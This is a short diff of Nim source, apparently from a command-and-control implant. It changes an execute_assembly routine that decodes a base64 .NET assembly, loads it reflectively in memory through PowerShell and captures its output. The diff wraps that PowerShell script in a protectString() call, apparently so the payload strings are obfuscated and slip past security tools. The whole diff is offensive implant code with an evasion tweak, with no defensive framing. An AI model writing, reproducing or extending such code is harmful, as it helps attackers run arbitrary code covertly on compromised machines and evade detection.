@@ -30,6 +30,7 @@ proc execute_assembly*(assembly_b64: string, assembly_args: string): (bool, stri
         pipeline.Commands.AddScript(fmt"""
         $assembly_b64 = "{assembly_b64}"
         $assembly_args = "{assembly_args}"
+        """ & protectString("""
         $assembly_bytes = [System.Convert]::FromBase64String($assembly_b64)
         $assembly = [Reflection.Assembly]::Load($assembly_bytes)
         $params = @(,[String[]]$assembly_args.Split(" "))
@@ -39,7 +40,7 @@ proc execute_assembly*(assembly_b64: string, assembly_args: string): (bool, stri
         [System.Console]::SetOut($Writer)
         $assembly.EntryPoint.invoke($null, $params)
         $Writer.GetStringBuilder().ToString()
-        """)
+        """))
         pipeline.Commands.Add(protectString("Out-String"))
         var results = pipeline.Invoke()
         for i in countUp(0, results.Count()-1):
